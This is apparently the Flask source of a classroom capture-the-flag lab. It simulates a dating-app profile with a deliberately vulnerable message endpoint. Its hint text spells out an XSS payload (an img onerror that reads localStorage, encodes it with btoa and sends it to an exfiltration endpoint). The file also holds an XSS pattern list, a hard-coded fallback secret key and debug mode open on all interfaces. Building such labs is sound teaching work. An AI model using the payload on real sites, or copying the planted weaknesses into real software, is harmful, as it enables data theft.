from flask import Flask, render_template, request, jsonify, session
import re
import random
import json
import base64
import os
from dotenv import load_dotenv

#load environment variables from .env file
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'super-secret-key-change-this-in-production')

#gets data from environment variables
VICTIM_DATA = {
    'username': 'Secret Admirer',
    'realName': os.getenv('VICTIM_NAME'),
    'email': os.getenv('VICTIM_EMAIL'),
    'studentID': os.getenv('VICTIM_STUDENT_ID'),
    'photo': 'mystery.jpg'
}

exfiltrated_data = {}

messages_db = []


@app.route('/')
def index():
    """Home page - dating app interface"""
    if 'student_id' not in session:
        session['student_id'] = 'student_' + str(random.randint(1000, 9999))
    
    return render_template('index.html')


@app.route('/profile/SecretAdmirer')
def victim_profile():
    """The victim's profile page (where XSS will happen)"""
    return render_template('profile.html', 
                         username='Secret Admirer',
                         bio='I’m big into photography and spend most of my free time behind a camera or out hiking. ' \
                         'I like to keep people guessing, so I won’t give everything away just yet.',
                         interests=['Hiking', 'Coffee', 'Reading', 'Fitness'])

@app.route('/profile/me')
def my_profile():
    """Current user's profile"""
    return render_template('myprofile.html')

@app.route('/api/post_message', methods=['POST'])
def post_message():
    """Handle messages posting (VULNERABLE endpoint)"""
    message = request.json.get('message', '')
    student_id = session.get('student_id')
    
    #store the message
    messages_db.append({
        'student_id': student_id,
        'message': message
    })
    
    #check if message contains XSS
    if is_xss(message):
        #simulate admirer viewing the message
        success = simulate_victim_view(message, student_id)
        
        if success:
            return jsonify({
                'success': True,
                'message': 'Message posted! Secret Admirer viewed it. Check if your attack worked!',
                'xss_detected': True
            })
        else:
            return jsonify({
                'success': True,
                'message': 'Message posted with XSS detected, but no data was exfiltrated. Try accessing localStorage and sending to /api/exfiltrate!',
                'xss_detected': True
            })
    else:
        return jsonify({
            'success': True,
            'message': 'Message posted!',
            'xss_detected': False
        })

def is_xss(text):
    """Simple check for XSS patterns"""
    xss_patterns = [
        r'<script',
        r'onerror\s*=',
        r'onload\s*=',
        r'javascript:',
        r'<img',
        r'<svg',
        r'<iframe',
        r'<body',
        r'<object',
        r'<embed'
    ]
    return any(re.search(pattern, text, re.IGNORECASE) for pattern in xss_patterns)


def simulate_victim_view(payload, student_id):
    
    accesses_storage = (
        'localStorage' in payload or 
        'cookie' in payload.lower()
    )
    
    sends_data = '/api/exfiltrate' in payload
    
    if accesses_storage and sends_data:
        print(f"[SIMULATION] XSS payload from student {student_id} would successfully exfiltrate data!")
        
        victim_data_json = json.dumps(VICTIM_DATA)
        
        #check if the payload uses base64 encoding
        if 'btoa' in payload:
            victim_data_encoded = base64.b64encode(victim_data_json.encode()).decode()
            print(f"[SIMULATION] Data encoded with btoa: {victim_data_encoded}")
        else:
            victim_data_encoded = victim_data_json
            print(f"[SIMULATION] Data sent without encoding: {victim_data_encoded}")
        
        #store the exfiltrated data
        exfiltrated_data[student_id] = victim_data_encoded
        
        print(f"[SIMULATION] Data stored for student {student_id}")
        return True
    
    else:
        print(f"[SIMULATION] XSS detected but incomplete:")
        print(f"  - Accesses storage: {accesses_storage}")
        print(f"  - Sends to exfiltrate: {sends_data}")
        return False


@app.route('/api/exfiltrate', methods=['GET', 'POST'])
def exfiltrate():
    """
    Endpoint where XSS payload sends stolen data
    This simulates the attacker's webhook/server
    """
    student_id = session.get('student_id')
    
    if request.method == 'GET':
        stolen_data = request.args.get('data')
    else:
        stolen_data = request.json.get('data') if request.is_json else request.form.get('data')
    
    if stolen_data:
        exfiltrated_data[student_id] = stolen_data
        return jsonify({'success': True, 'message': 'Data received!'})
    
    return jsonify({'success': False, 'message': 'No data received'})


@app.route('/api/check_exfiltrated')
def check_exfiltrated():
    """
    Student checks if they successfully stole data
    """
    student_id = session.get('student_id')
    data = exfiltrated_data.get(student_id, '')
    
    if not data:
        return jsonify({
            'success': False,
            'message': '❌ No data exfiltrated yet.',
            'hint': 'Your XSS payload needs to: (1) access localStorage.getItem("realProfile"), and (2) send it to /api/exfiltrate',
            'example': '<img src=x onerror="fetch(\'/api/exfiltrate?data=\'+btoa(localStorage.getItem(\'realProfile\')))">'
        })
    
    #try to decode if base64
    try:
        decoded_data = base64.b64decode(data).decode()
    except:
        decoded_data = data
    
    #check if they got the real name
    if 'Damien Holton' in decoded_data or 'damienH@gmail.com' in decoded_data:
        return jsonify({
            'success': True,
            'flag': os.getenv('CTF_FLAG'),
            'message': '🎉 SUCCESS! You discovered Secret Admirer\'s real identity!',
            'data': decoded_data,
            'victim_info': VICTIM_DATA
        })
    else:
        return jsonify({
            'success': False,
            'message': '⚠️ You exfiltrated some data, but it doesn\'t contain the victim\'s identity.',
            'data_received': decoded_data,
            'hint': 'Make sure you\'re accessing localStorage.getItem("realProfile")'
        })


@app.route('/api/get_messages')
def get_messages():
    """Get all messages (for display)"""
    return jsonify({'messages': messages_db})


@app.route('/api/reset')
def reset():
    """Reset student's progress"""
    student_id = session.get('student_id')
    if student_id in exfiltrated_data:
        del exfiltrated_data[student_id]
    
    global messages_db
    messages_db = [c for c in messages_db if c['student_id'] != student_id]
    
    return jsonify({'success': True, 'message': 'Progress reset!'})


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)